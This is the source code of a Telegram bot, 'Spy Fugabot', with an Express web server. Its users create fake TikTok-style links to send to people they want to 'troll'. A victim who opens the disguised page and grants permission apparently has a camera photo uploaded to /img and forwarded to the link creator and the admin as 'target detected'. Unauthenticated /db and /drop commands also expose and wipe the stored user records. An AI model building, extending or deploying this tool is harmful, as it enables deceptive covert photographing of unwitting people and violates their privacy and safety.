require("dotenv").config();
const { Telegraf, session, Markup } = require("telegraf");
const template = require("./template.js");

const DB = require("./connectDB.js");
const dataBase = DB.connect('spy_fugabot');
const dataBaseLinks = DB.connect('spy_fugabot_links');

const express = require("express");
const fs = require("fs");
const cors = require("cors");
const app = express();

const bot = new Telegraf(process.env.TOKEN);
const admin = process.env.ADMIN;

bot.use(session());
bot.telegram.setMyCommands([{ command: "start", description: "Начать диалог" }]);

app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ limit: "50mb", extended: true }));

app.use(express.json());
app.use(express.static("public"));
app.use(express.static("src"));
app.use(cors({ methods: ["POST", "GET"] }));



function base64(img, id_t) {
  const current_name = new Date().getTime();

  const matches = img.match(/^data:image\/(\w+);base64,(.+)$/);
  if (!matches) {
    throw new Error("Invalid input string");
  }
  const extension = matches[1];
  const data = matches[2];
  const buffer = Buffer.from(data, "base64");

  const fileName = `public/${current_name}.${extension}`;
  fs.writeFileSync(fileName, buffer);

  dataBase.findOne({ id_video: id_t * 1 }).then((res) => {
    console.log(res);
    if (res !== null) {
      bot.telegram.sendMediaGroup(res.id, [
        {
          type: "photo",
          caption: `<b>🕵️♂️ Цель обнаружена!</b>`,
          parse_mode: "HTML",
          media: { source: `public/${current_name}.png` },
          //media:`http://localhost:3000/${current_name}.png`
        },
      ]);

      bot.telegram.sendMediaGroup(admin, [
        {
          type: "photo",
          caption: `<b>🕵️♂️ Цель обнаружена от пользователя @${res.username}! </b>`,
          parse_mode: "HTML",
          media: { source: `public/${current_name}.png` },
          //media:`http://localhost:3000/${current_name}.png`
        },
      ]);
      
    }
    
  });
}

bot.command("start", async (ctx) => {
  const { id, first_name, username, language_code } = ctx.from;

  dataBase.findOne({ id, first_name, username }).then((res) => {
    if (!res) {
      console.log("Запись  создаеться");
      dataBase.insertOne({ id, first_name, username, id_video: dateNow() });
    } else {
      console.log("Запись уже создана");
    }
  }).catch(e =>{
    console.log(e)
  })

  ctx.replyWithPhoto("https://i.ibb.co/MysyVfwK/file-00000000d7c882108c236da29c583a63.png", {
    caption: `🕵️‍♂️ <b>Добро пожаловать в Spy Fugabot!</b>\n\n<blockquote>Это оружие для настоящих 42 братух. 🔗 Создай персональную ссылку и отправь её тому, кого хочешь затроллить!</blockquote>`,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: [ [{ text: "🔗 Создать ссылку", callback_data: `begin` }] ] }
  });
});

bot.action("begin", (ctx) => {
  const { id, first_name, username, language_code } = ctx.from;

  dataBase.findOne({ id }).then((res) => {
    ctx.reply(
      `<b>📸 Вы получите фото, если кто-то перейдет по вашей ссылке и даст разрешение. </b>`,
      { parse_mode: "HTML", reply_markup: { inline_keyboard: [ [{ text: "🔗 Создать ссылку ", callback_data: `create_link` }] ] } }
    );

  });
});

bot.command("db", async (ctx) => {
  dataBase.find({}).then((res) => {
    ctx.reply("```js" + JSON.stringify(res, null, 2) + "```", {
      parse_mode: "Markdown",
    });
  });
});

bot.command("drop", async (ctx) => {
  dataBase.deleteMany({});
  ctx.reply("DROP COLLECTION");
});











bot.action("create_link", async (ctx) => {
  await ctx.answerCbQuery();
  ctx.session ??= {};
  ctx.session.createLink = { step: "title", title: "", description: "", preview: null, author: "" };

  await ctx.reply("📝 Введите название тиктока:");
});

bot.on("message", async (ctx, next) => {
  const data = ctx.session?.createLink;
  if (!data) return next();
  const message = ctx.message;

  // Отмена создания
  if (message.text === "/cancel") {
    ctx.session.createLink = null;
    return ctx.reply("❌ Создание ссылки отменено.");
  }

  // Шаг 1. Название
  if (data.step === "title") {
    if (!message.text) {
      return ctx.reply("⚠️ Введите название текстом.");
    }

    data.title = message.text;
    data.step = "description";

    return ctx.reply("📄 Теперь введите описание:");
  }

  // Шаг 2. Описание
  if (data.step === "description") {
    if (!message.text) {
      return ctx.reply("⚠️ Введите описание текстом.");
    }

    data.description = message.text;
    data.step = "preview";

    return ctx.reply("🖼 Отправьте изображение для превью:");
  }

  // Шаг 3. Превью
  if (data.step === "preview") {
    if (!message.photo) {
      return ctx.reply("⚠️ Необходимо отправить фотографию.");
    }

    const photo = message.photo[message.photo.length - 1];

    data.preview = photo.file_id;
    data.step = "author";

    return ctx.reply("👤 Укажите автора видео:");
  }

  // Шаг 4. Автор
  if (data.step === "author") {
    if (!message.text) {
      return ctx.reply("⚠️ Укажите автора текстом.");
    }

    data.author = message.text;
    data.step = "complete";

    return ctx.reply(
      `✅ <b>Данные заполнены!</b>\n\n` +
      `📌 Название: ${data.title}\n` +
      `📄 Описание: ${data.description}\n` +
      `👤 Автор: ${data.author}\n\n` +
      `🖼 Превью: получено`,
      {
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [Markup.button.callback("🔗 Создать ссылку", "confirm_create_link")],
          [Markup.button.callback("❌ Отменить", "cancel_create_link")]
        ])
      }
    );
  }
});


bot.action("cancel_create_link", async (ctx) => {
  await ctx.answerCbQuery();
  if (ctx.session) {
    ctx.session.createLink = null;
  }
  await ctx.reply("❌ Создание ссылки отменено.");
});

bot.action("confirm_create_link", async (ctx) => {
  await ctx.answerCbQuery();
  const data = ctx.session?.createLink;
  if (!data || data.step !== "complete") {
    return ctx.reply("⚠️ Данные не найдены. Начните заново.");
  }
  await ctx.reply("✅ Все данные готовы к созданию ссылки!");
  ctx.session.createLink = null;
});



// https://i.ibb.co/RkmYcyWw/file-00000000ee948210945776bf48195e67.png




app.get("/video", (req, res) => {
  console.log("---")
  res.send(template("title","description", "image", "author", "poster"));
  // res.sendFile(__dirname + "/src/index.html");
});

app.get("/task-client", (req, res) => {
  res.send("task");
});



app.post("/img", async (req, res) => {
  base64(req.body.img, req.body.id);
  res.send({ type: true });
});

app.get("/sleep", async (req, res) => {
  res.send({ type: true });
});
app.post("/sleep", async (req, res) => {
  res.send({ type: true });
});

bot.launch();



function dateNow() {
  return new Date().getTime();
}
app.listen(3000, (err) => { err ? err : console.log("Started") });
